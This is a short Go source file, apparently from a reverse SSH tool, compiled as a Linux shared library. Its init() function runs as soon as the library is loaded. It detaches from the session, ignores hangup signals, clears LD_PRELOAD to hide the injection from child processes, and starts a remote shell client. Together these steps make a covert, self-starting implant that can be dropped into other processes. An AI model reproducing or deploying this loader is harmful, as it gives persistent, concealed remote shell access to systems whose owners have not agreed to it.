//go:build linux && cgo && cshared

package main

import (
	"os"
	"os/signal"
	"syscall"

	"rssh/internal/client"
)

func init() {
	syscall.Setsid()
	signal.Ignore(syscall.SIGHUP)
	//If we're loading as a shared lib, stop our children from being polluted
	os.Setenv("LD_PRELOAD", "")

	settings, _ := makeInitialSettings()

	client.Run(settings)
}
